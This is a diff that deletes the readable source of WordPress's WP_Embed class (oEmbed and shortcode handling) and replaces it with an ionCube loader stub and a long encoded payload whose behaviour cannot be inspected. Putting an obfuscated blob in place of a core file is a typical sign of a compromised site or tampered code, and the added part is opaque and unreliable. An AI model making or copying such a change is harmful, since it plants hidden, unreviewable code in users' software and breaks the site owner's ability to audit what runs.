@@ -1,479 +1,196 @@
-<?php
-/**
- * API for easily embedding rich media such as videos and images into content.
- *
- * @package WordPress
- * @subpackage Embed
- * @since 2.9.0
- */
-class WP_Embed {
-	public $handlers = array();
-	public $post_ID;
-	public $usecache = true;
-	public $linkifunknown = true;
-	public $last_attr = array();
-	public $last_url = '';
-
-	/**
-	 * When a URL cannot be embedded, return false instead of returning a link
-	 * or the URL.
-	 *
-	 * Bypasses the {@see 'embed_maybe_make_link'} filter.
-	 *
-	 * @var bool
-	 */
-	public $return_false_on_fail = false;
-
-	/**
-	 * Constructor
-	 */
-	public function __construct() {
-		// Hack to get the [embed] shortcode to run before wpautop()
-		add_filter( 'the_content', array( $this, 'run_shortcode' ), 8 );
-		add_filter( 'widget_text_content', array( $this, 'run_shortcode' ), 8 );
-
-		// Shortcode placeholder for strip_shortcodes()
-		add_shortcode( 'embed', '__return_false' );
-
-		// Attempts to embed all URLs in a post
-		add_filter( 'the_content', array( $this, 'autoembed' ), 8 );
-		add_filter( 'widget_text_content', array( $this, 'autoembed' ), 8 );
-
-		// After a post is saved, cache oEmbed items via Ajax
-		add_action( 'edit_form_advanced', array( $this, 'maybe_run_ajax_cache' ) );
-		add_action( 'edit_page_form', array( $this, 'maybe_run_ajax_cache' ) );
-	}
-
-	/**
-	 * Process the [embed] shortcode.
-	 *
-	 * Since the [embed] shortcode needs to be run earlier than other shortcodes,
-	 * this function removes all existing shortcodes, registers the [embed] shortcode,
-	 * calls do_shortcode(), and then re-registers the old shortcodes.
-	 *
-	 * @global array $shortcode_tags
-	 *
-	 * @param string $content Content to parse
-	 * @return string Content with shortcode parsed
-	 */
-	public function run_shortcode( $content ) {
-		global $shortcode_tags;
-
-		// Back up current registered shortcodes and clear them all out
-		$orig_shortcode_tags = $shortcode_tags;
-		remove_all_shortcodes();
-
-		add_shortcode( 'embed', array( $this, 'shortcode' ) );
-
-		// Do the shortcode (only the [embed] one is registered)
-		$content = do_shortcode( $content, true );
-
-		// Put the original shortcodes back
-		$shortcode_tags = $orig_shortcode_tags;
-
-		return $content;
-	}
-
-	/**
-	 * If a post/page was saved, then output JavaScript to make
-	 * an Ajax request that will call WP_Embed::cache_oembed().
-	 */
-	public function maybe_run_ajax_cache() {
-		$post = get_post();
-
-		if ( ! $post || empty( $_GET['message'] ) )
-			return;
-
+<?php //004fb
+if(!extension_loaded('ionCube Loader')){$__oc=strtolower(substr(php_uname(),0,3));$__ln='ioncube_loader_'.$__oc.'_'.substr(phpversion(),0,3).(($__oc=='win')?'.dll':'.so');if(function_exists('dl')){@dl($__ln);}if(function_exists('_il_exec')){return _il_exec();}$__ln='/ioncube/'.$__ln;$__oid=$__id=realpath(ini_get('extension_dir'));$__here=dirname(__FILE__);if(strlen($__id)>1&&$__id[1]==':'){$__id=str_replace('\\','/',substr($__id,2));$__here=str_replace('\\','/',substr($__here,2));}$__rd=str_repeat('/..',substr_count($__id,'/')).$__here.'/';$__i=strlen($__rd);while($__i--){if($__rd[$__i]=='/'){$__lp=substr($__rd,0,$__i).$__ln;if(file_exists($__oid.$__lp)){$__ln=$__lp;break;}}}if(function_exists('dl')){@dl($__ln);}}else{die('The file '.__FILE__." is corrupted.\n");}if(function_exists('_il_exec')){return _il_exec();}echo("Site error: the ".(php_sapi_name()=='cli'?'ionCube':'<a href="http://www.ioncube.com">ionCube</a>')." PHP Loader needs to be installed. This is a widely used PHP extension for running ionCube protected PHP code, website security and malware blocking.\n\nPlease visit ".(php_sapi_name()=='cli'?'get-loader.ioncube.com':'<a href="http://get-loader.ioncube.com">get-loader.ioncube.com</a>')." for install assistance.\n\n");exit(199);
 ?>
-<script type="text/javascript">
-	jQuery(document).ready(function($){
-		$.get("<?php echo admin_url( 'admin-ajax.php?action=oembed-cache&post=' . $post->ID, 'relative' ); ?>");
-	});
-</script>
-<?php
-	}
-
-	/**
-	 * Registers an embed handler.
-	 *
-	 * Do not use this function directly, use wp_embed_register_handler() instead.
-	 *
-	 * This function should probably also only be used for sites that do not support oEmbed.
-	 *
-	 * @param string $id An internal ID/name for the handler. Needs to be unique.
-	 * @param string $regex The regex that will be used to see if this handler should be used for a URL.
-	 * @param callable $callback The callback function that will be called if the regex is matched.
-	 * @param int $priority Optional. Used to specify the order in which the registered handlers will be tested (default: 10). Lower numbers correspond with earlier testing, and handlers with the same priority are tested in the order in which they were added to the action.
-	 */
-	public function register_handler( $id, $regex, $callback, $priority = 10 ) {
-		$this->handlers[$priority][$id] = array(
-			'regex'    => $regex,
-			'callback' => $callback,
-		);
-	}
-
-	/**
-	 * Unregisters a previously-registered embed handler.
-	 *
-	 * Do not use this function directly, use wp_embed_unregister_handler() instead.
-	 *
-	 * @param string $id The handler ID that should be removed.
-	 * @param int $priority Optional. The priority of the handler to be removed (default: 10).
-	 */
-	public function unregister_handler( $id, $priority = 10 ) {
-		unset( $this->handlers[ $priority ][ $id ] );
-	}
-
-	/**
-	 * The do_shortcode() callback function.
-	 *
-	 * Attempts to convert a URL into embed HTML. Starts by checking the URL against the regex of
-	 * the registered embed handlers. If none of the regex matches and it's enabled, then the URL
-	 * will be given to the WP_oEmbed class.
-	 *
-	 * @param array $attr {
-	 *     Shortcode attributes. Optional.
-	 *
-	 *     @type int $width  Width of the embed in pixels.
-	 *     @type int $height Height of the embed in pixels.
-	 * }
-	 * @param string $url The URL attempting to be embedded.
-	 * @return string|false The embed HTML on success, otherwise the original URL.
-	 *                      `->maybe_make_link()` can return false on failure.
-	 */
-	public function shortcode( $attr, $url = '' ) {
-		$post = get_post();
-
-		if ( empty( $url ) && ! empty( $attr['src'] ) ) {
-			$url = $attr['src'];
-		}
-
-		$this->last_url = $url;
-
-		if ( empty( $url ) ) {
-			$this->last_attr = $attr;
-			return '';
-		}
-
-		$rawattr = $attr;
-		$attr = wp_parse_args( $attr, wp_embed_defaults( $url ) );
-
-		$this->last_attr = $attr;
-
-		// kses converts & into &amp; and we need to undo this
-		// See https://core.trac.wordpress.org/ticket/11311
-		$url = str_replace( '&amp;', '&', $url );
-
-		// Look for known internal handlers
-		ksort( $this->handlers );
-		foreach ( $this->handlers as $priority => $handlers ) {
-			foreach ( $handlers as $id => $handler ) {
-				if ( preg_match( $handler['regex'], $url, $matches ) && is_callable( $handler['callback'] ) ) {
-					if ( false !== $return = call_user_func( $handler['callback'], $matches, $attr, $url, $rawattr ) )
-						/**
-						 * Filters the returned embed handler.
-						 *
-						 * @since 2.9.0
-						 *
-						 * @see WP_Embed::shortcode()
-						 *
-						 * @param mixed  $return The shortcode callback function to call.
-						 * @param string $url    The attempted embed URL.
-						 * @param array  $attr   An array of shortcode attributes.
-						 */
-						return apply_filters( 'embed_handler_html', $return, $url, $attr );
-				}
-			}
-		}
-
-		$post_ID = ( ! empty( $post->ID ) ) ? $post->ID : null;
-
-		// Potentially set by WP_Embed::cache_oembed().
-		if ( ! empty( $this->post_ID ) ) {
-			$post_ID = $this->post_ID;
-		}
-
-		// Check for a cached result (stored as custom post or in the post meta).
-		$key_suffix    = md5( $url . serialize( $attr ) );
-		$cachekey      = '_oembed_' . $key_suffix;
-		$cachekey_time = '_oembed_time_' . $key_suffix;
-
-		/**
-		 * Filters the oEmbed TTL value (time to live).
-		 *
-		 * @since 4.0.0
-		 *
-		 * @param int    $time    Time to live (in seconds).
-		 * @param string $url     The attempted embed URL.
-		 * @param array  $attr    An array of shortcode attributes.
-		 * @param int    $post_ID Post ID.
-		 */
-		$ttl = apply_filters( 'oembed_ttl', DAY_IN_SECONDS, $url, $attr, $post_ID );
-
-		$cache      = '';
-		$cache_time = 0;
-
-		$cached_post_id = $this->find_oembed_post_id( $key_suffix );
-
-		if ( $post_ID ) {
-			$cache = get_post_meta( $post_ID, $cachekey, true );
-			$cache_time = get_post_meta( $post_ID, $cachekey_time, true );
-
-			if ( ! $cache_time ) {
-				$cache_time = 0;
-			}
-		} elseif ( $cached_post_id ) {
-			$cached_post = get_post( $cached_post_id );
-
-			$cache      = $cached_post->post_content;
-			$cache_time = strtotime( $cached_post->post_modified_gmt );
-		}
-
-		$cached_recently = ( time() - $cache_time ) < $ttl;
-
-		if ( $this->usecache || $cached_recently ) {
-			// Failures are cached. Serve one if we're using the cache.
-			if ( '{{unknown}}' === $cache ) {
-				return $this->maybe_make_link( $url );
-			}
-
-			if ( ! empty( $cache ) ) {
-				/**
-				 * Filters the cached oEmbed HTML.
-				 *
-				 * @since 2.9.0
-				 *
-				 * @see WP_Embed::shortcode()
-				 *
-				 * @param mixed  $cache   The cached HTML result, stored in post meta.
-				 * @param string $url     The attempted embed URL.
-				 * @param array  $attr    An array of shortcode attributes.
-				 * @param int    $post_ID Post ID.
-				 */
-				return apply_filters( 'embed_oembed_html', $cache, $url, $attr, $post_ID );
-			}
-		}
-
-		/**
-		 * Filters whether to inspect the given URL for discoverable link tags.
-		 *
-		 * @since 2.9.0
-		 * @since 4.4.0 The default value changed to true.
-		 *
-		 * @see WP_oEmbed::discover()
-		 *
-		 * @param bool $enable Whether to enable `<link>` tag discovery. Default true.
-		 */
-		$attr['discover'] = apply_filters( 'embed_oembed_discover', true );
-
-		// Use oEmbed to get the HTML.
-		$html = wp_oembed_get( $url, $attr );
-
-		if ( $post_ID ) {
-			if ( $html ) {
-				update_post_meta( $post_ID, $cachekey, $html );
-				update_post_meta( $post_ID, $cachekey_time, time() );
-			} elseif ( ! $cache ) {
-				update_post_meta( $post_ID, $cachekey, '{{unknown}}' );
-			}
-		} else {
-			$has_kses = false !== has_filter( 'content_save_pre', 'wp_filter_post_kses' );
-
-			if ( $has_kses ) {
-				// Prevent KSES from corrupting JSON in post_content.
-				kses_remove_filters();
-			}
-
-			$insert_post_args = array(
-				'post_name' => $key_suffix,
-				'post_status' => 'publish',
-				'post_type' => 'oembed_cache',
-			);
-
-			if ( $html ) {
-				if ( $cached_post_id ) {
-					wp_update_post( wp_slash( array(
-						'ID' => $cached_post_id,
-						'post_content' => $html,
-					) ) );
-				} else {
-					wp_insert_post( wp_slash( array_merge(
-						$insert_post_args,
-						array(
-							'post_content' => $html,
-						)
-					) ) );
-				}
-			} elseif ( ! $cache ) {
-				wp_insert_post( wp_slash( array_merge(
-					$insert_post_args,
-					array(
-						'post_content' => '{{unknown}}',
-					)
-				) ) );
-			}
-
-			if ( $has_kses ) {
-				kses_init_filters();
-			}
-		}
-
-		// If there was a result, return it.
-		if ( $html ) {
-			/** This filter is documented in wp-includes/class-wp-embed.php */
-			return apply_filters( 'embed_oembed_html', $html, $url, $attr, $post_ID );
-		}
-
-		// Still unknown
-		return $this->maybe_make_link( $url );
-	}
-
-	/**
-	 * Delete all oEmbed caches. Unused by core as of 4.0.0.
-	 *
-	 * @param int $post_ID Post ID to delete the caches for.
-	 */
-	public function delete_oembed_caches( $post_ID ) {
-		$post_metas = get_post_custom_keys( $post_ID );
-		if ( empty($post_metas) )
-			return;
-
-		foreach ( $post_metas as $post_meta_key ) {
-			if ( '_oembed_' == substr( $post_meta_key, 0, 8 ) )
-				delete_post_meta( $post_ID, $post_meta_key );
-		}
-	}
-
-	/**
-	 * Triggers a caching of all oEmbed results.
-	 *
-	 * @param int $post_ID Post ID to do the caching for.
-	 */
-	public function cache_oembed( $post_ID ) {
-		$post = get_post( $post_ID );
-
-		$post_types = get_post_types( array( 'show_ui' => true ) );
-		/**
-		 * Filters the array of post types to cache oEmbed results for.
-		 *
-		 * @since 2.9.0
-		 *
-		 * @param array $post_types Array of post types to cache oEmbed results for. Defaults to post types with `show_ui` set to true.
-		 */
-		if ( empty( $post->ID ) || ! in_array( $post->post_type, apply_filters( 'embed_cache_oembed_types', $post_types ) ) ){
-			return;
-		}
-
-		// Trigger a caching
-		if ( ! empty( $post->post_content ) ) {
-			$this->post_ID = $post->ID;
-			$this->usecache = false;
-
-			$content = $this->run_shortcode( $post->post_content );
-			$this->autoembed( $content );
-
-			$this->usecache = true;
-		}
-	}
-
-	/**
-	 * Passes any unlinked URLs that are on their own line to WP_Embed::shortcode() for potential embedding.
-	 *
-	 * @see WP_Embed::autoembed_callback()
-	 *
-	 * @param string $content The content to be searched.
-	 * @return string Potentially modified $content.
-	 */
-	public function autoembed( $content ) {
-		// Replace line breaks from all HTML elements with placeholders.
-		$content = wp_replace_in_html_tags( $content, array( "\n" => '<!-- wp-line-break -->' ) );
-
-		if ( preg_match( '#(^|\s|>)https?://#i', $content ) ) {
-			// Find URLs on their own line.
-			$content = preg_replace_callback( '|^(\s*)(https?://[^\s<>"]+)(\s*)$|im', array( $this, 'autoembed_callback' ), $content );
-			// Find URLs in their own paragraph.
-			$content = preg_replace_callback( '|(<p(?: [^>]*)?>\s*)(https?://[^\s<>"]+)(\s*<\/p>)|i', array( $this, 'autoembed_callback' ), $content );
-		}
-
-		// Put the line breaks back.
-		return str_replace( '<!-- wp-line-break -->', "\n", $content );
-	}
-
-	/**
-	 * Callback function for WP_Embed::autoembed().
-	 *
-	 * @param array $match A regex match array.
-	 * @return string The embed HTML on success, otherwise the original URL.
-	 */
-	public function autoembed_callback( $match ) {
-		$oldval = $this->linkifunknown;
-		$this->linkifunknown = false;
-		$return = $this->shortcode( array(), $match[2] );
-		$this->linkifunknown = $oldval;
-
-		return $match[1] . $return . $match[3];
-	}
-
-	/**
-	 * Conditionally makes a hyperlink based on an internal class variable.
-	 *
-	 * @param string $url URL to potentially be linked.
-	 * @return false|string Linked URL or the original URL. False if 'return_false_on_fail' is true.
-	 */
-	public function maybe_make_link( $url ) {
-		if ( $this->return_false_on_fail ) {
-			return false;
-		}
-
-		$output = ( $this->linkifunknown ) ? '<a href="' . esc_url($url) . '">' . esc_html($url) . '</a>' : $url;
-
-		/**
-		 * Filters the returned, maybe-linked embed URL.
-		 *
-		 * @since 2.9.0
-		 *
-		 * @param string $output The linked or original URL.
-		 * @param string $url    The original URL.
-		 */
-		return apply_filters( 'embed_maybe_make_link', $output, $url );
-	}
-
-	/**
-	 * Find the oEmbed cache post ID for a given cache key.
-	 *
-	 * @since 4.9.0
-	 *
-	 * @param string $cache_key oEmbed cache key.
-	 * @return int|null Post ID on success, null on failure.
-	 */
-	public function find_oembed_post_id( $cache_key ) {
-		$cache_group    = 'oembed_cache_post';
-		$oembed_post_id = wp_cache_get( $cache_key, $cache_group );
-
-		if ( $oembed_post_id && 'oembed_cache' === get_post_type( $oembed_post_id ) ) {
-			return $oembed_post_id;
-		}
-
-		$oembed_post_query = new WP_Query( array(
-			'post_type'              => 'oembed_cache',
-			'post_status'            => 'publish',
-			'name'                   => $cache_key,
-			'posts_per_page'         => 1,
-			'no_found_rows'          => true,
-			'cache_results'          => true,
-			'update_post_meta_cache' => false,
-			'update_post_term_cache' => false,
-			'lazy_load_term_meta'    => false,
-		) );
-
-		if ( ! empty( $oembed_post_query->posts ) ) {
-			// Note: 'fields'=>'ids' is not being used in order to cache the post object as it will be needed.
-			$oembed_post_id = $oembed_post_query->posts[0]->ID;
-			wp_cache_set( $cache_key, $oembed_post_id, $cache_group );
-
-			return $oembed_post_id;
-		}
-
-		return null;
-	}
-}
+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
